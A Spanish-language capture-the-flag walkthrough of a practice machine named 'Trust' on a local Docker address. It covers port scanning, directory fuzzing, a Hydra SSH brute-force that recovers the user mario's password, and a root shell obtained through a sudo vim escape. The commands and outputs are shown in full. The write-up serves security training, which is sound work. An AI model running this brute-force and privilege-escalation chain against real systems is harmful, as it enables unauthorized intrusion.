# Trust

## Reconocimiento y Enumeración

Comprobar que la máquina está en marcha.

```bash
❯ ping -c 1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.036 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.036/0.036/0.036/0.000 ms

```

Una vez nos responde ping y ya podemos empezar enumerando la máquina. El ttl=64 nos puede indicar que sea una máquina **Linux**.

Lanzamos nmap para ver que puertos nos encuentra.

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn -oG allPorts 172.17.0.2
```
- `-sS`: Realiza un escaneo SYN.
- `-p-`: Escanea todos los puertos.
- `--open`: Muestra solo los puertos abiertos.
- `--min-rate 5000`: Establece la velocidad mínima de envío de paquetes a 5000 por segundo.
- `-vvv`: Genera una salida muy detallada y verbosa.
- `-n`: Evita la resolución de DNS inversa.
- `-Pn`: Omite la detección de hosts.
- `-oG allPorts`: Guarda los resultados en un archivo llamado "allPorts".
- `172.17.0.2`: La dirección IP del host objetivo.

```bash
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

```

Como tenemos abiertos los puertos 22 y 80, vamos a comprobar las versiones y lanzar unos scripts básicos para ver que información obtenemos.

```bash
nmap -sCV -p22,80 -vvv -oN versionPorts 172.17.0.2
```
- `-sCV`: Escaneo de versiones y vulnerabilidades.
- `-p22,80`: Escaneo de los puertos 22 (SSH) y 80 (HTTP).
- `-vvv`: Salida muy detallada y verbosa.
- `-oN versionPorts`: Guarda los resultados en "versionPorts".
- `172.17.0.2`: Dirección IP del host escaneado.

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 19:a1:1a:42:fa:3a:9d:9a:0f:ea:91:7f:7e:db:a3:c7 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHjaznpuQYsT/kxLXSVDFJGTtesV6UrUh5aNJhw+tAdr19MnZpuY/8e0gb+NXRebo5Dcv/DP1H+aLFHaS6+XCGw=
|   256 a6:fd:cf:45:a6:95:05:2c:58:10:73:8d:39:57:2b:ff (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJW/dREGeklk/wsHXisOmbmVwP9zg7U8xS+OfHkxLF0Z
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.57 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
No vemos nada que nos llame la atención así que empezaremos la enumeración del puerto 80, y como vemos que el título ya nos muestra que es la página principal de Apache por lo que lanzamos gobuster para ir haciendo fuzzing.

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php, txt, html
```
- `dir`: Indica que se realizará un escaneo de directorios.
- `-u http://172.17.0.2/`: Especifica la URL objetivo a escanear.
- `-w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`: Especifica la lista de palabras clave a utilizar para la búsqueda de directorios. En este caso, se utiliza el archivo "directory-list-2.3-medium.txt" como lista de palabras clave.
- `-x php,txt,html`: Especifica las extensiones de archivo a buscar dentro de los directorios encontrados. En este caso, se buscarán archivos con extensiones ".php", ".txt" y ".html".
- 
```bash
❯ gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php, txt, html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/.                    (Status: 200) [Size: 10701]
/secret.php           (Status: 200) [Size: 927]
/.php                 (Status: 403) [Size: 275]
/.                    (Status: 200) [Size: 10701]
/server-status        (Status: 403) [Size: 275]

```


Encontramos una página que nos llama la atención, que es **/secret.php**.

En la página http://172.17.0.2/secret.php encontramos un mensaje de lo que podemos pensar que **Mario** podría ser un usuario. Como tenemos el puerto 22 abierto, podríamos probar la intrusión por fuerza bruta con hydra.

## Explotación

```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
```
- `-l mario`: Especifica el nombre de usuario "mario" para el intento de inicio de sesión.
- `-P /usr/share/wordlists/rockyou.txt`: Especifica la ubicación del archivo de contraseñas a utilizar. En este caso, se utiliza el archivo "rockyou.txt" como lista de contraseñas.
- `ssh://172.17.0.2`: Indica el protocolo a utilizar (`ssh`) y la dirección IP del host objetivo (`172.17.0.2`). Esto establece el destino del intento de inicio de sesión mediante SSH.

Con hydra encontramos la contraseña para el usuario *mario* por el puerto 22.
```bash
❯ hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-11 11:20:24
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: mario   password: chocolate
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-05-11 11:20:36
```

Nos conectamos por ssh como el usuario mario y tenemos acceso a la máquina.

```bash
ssh mario@172.17.0.2
```

```bash
❯ ssh mario@172.17.0.2

mario@172.17.0.2's password: 

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Mar 20 09:54:46 2024 from 192.168.0.21
mario@49a6455029e0:~$ 
```

Una vez dentro para escalar privilegios, vamos a probar si hay algún archivo que podamos ejecutar como mario pero con permisos de root.

```bash
sudo -l
```

```bash
mario@49a6455029e0:~$ sudo -l
[sudo] password for mario: 
Matching Defaults entries for mario on 49a6455029e0:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on 49a6455029e0:
    (ALL) /usr/bin/vim
```

Encontramos que podemos ejecutar el editor de texto vim, y desde ahí se puede lanzar una bash con permiso privilegiado, poniendo :!/bin/bash.

```bash
sudo vim -c ':!/bin/bash'
```

Y con esto ya tenemos una consola como root.

```bash
root@49a6455029e0:/home/mario# whoami
root
```

